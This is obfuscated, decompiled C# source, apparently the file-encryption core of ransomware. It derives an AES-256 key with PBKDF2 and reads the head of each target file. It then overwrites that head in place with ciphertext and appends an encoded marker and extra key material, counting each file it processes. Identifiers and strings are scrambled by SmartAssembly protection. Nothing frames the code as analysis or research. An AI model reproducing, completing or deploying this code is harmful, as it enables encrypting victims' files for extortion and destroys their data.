using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

public static class GWOsLqMwIb
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] buNDQCFBoGJ(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = TJzzVhJFHqjWnSUw(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes TJzzVhJFHqjWnSUw(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] WvcDKTbtliDrPF(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (ZNYsMUGPdZxeAunY.ObdFXRKnttrKo == getString_0(107396999))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (ZNYsMUGPdZxeAunY.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(ZNYsMUGPdZxeAunY.TVaVFXxrZtbC, getString_0(107365552) + string_0 + getString_0(107477179) + ex.Message + getString_0(107396705));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void isjSvDiECOPp(string PFFKOkRvQq, byte[] PwpxQaHWCtbm, byte[] lsppjlmhfssIIIt = null)
	{
		try
		{
			byte[] array = null;
			if (ZNYsMUGPdZxeAunY.ObdFXRKnttrKo == getString_0(107396999))
			{
				array = (ZNYsMUGPdZxeAunY.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633))) : Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(PFFKOkRvQq, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(PwpxQaHWCtbm, 0, PwpxQaHWCtbm.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(PFFKOkRvQq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ZNYsMUGPdZxeAunY.jHNjZakAkEHPd)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(lsppjlmhfssIIIt, 0, lsppjlmhfssIIIt.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (ZNYsMUGPdZxeAunY.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633))) : Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610))));
				FileStream fileStream2 = new FileStream(PFFKOkRvQq, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(PwpxQaHWCtbm, 0, PwpxQaHWCtbm.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(PFFKOkRvQq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!ZNYsMUGPdZxeAunY.jHNjZakAkEHPd)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(lsppjlmhfssIIIt, 0, lsppjlmhfssIIIt.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			ZNYsMUGPdZxeAunY.LHsTakbnvLMZqfZlb++;
		}
		catch (Exception ex)
		{
			if (ZNYsMUGPdZxeAunY.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(ZNYsMUGPdZxeAunY.TVaVFXxrZtbC, getString_0(107365552) + PFFKOkRvQq + getString_0(107477624) + ex.Message + getString_0(107396705));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (ZNYsMUGPdZxeAunY.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477633))) : Encoding.ASCII.GetBytes(ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(ZNYsMUGPdZxeAunY.DlqNAdVPvtac) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610)) + Convert.ToString(ZNYsMUGPdZxeAunY.VwOPUhcZlsvZmR) + ZNYsMUGPdZxeAunY.IOVuiCuRiaYQ(getString_0(107477610))));
			FileStream fileStream4 = new FileStream(PFFKOkRvQq, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(PwpxQaHWCtbm, 0, PwpxQaHWCtbm.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(PFFKOkRvQq, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!ZNYsMUGPdZxeAunY.jHNjZakAkEHPd)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(lsppjlmhfssIIIt, 0, lsppjlmhfssIIIt.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static GWOsLqMwIb()
	{
		Strings.CreateGetStringDelegate(typeof(GWOsLqMwIb));
	}
}
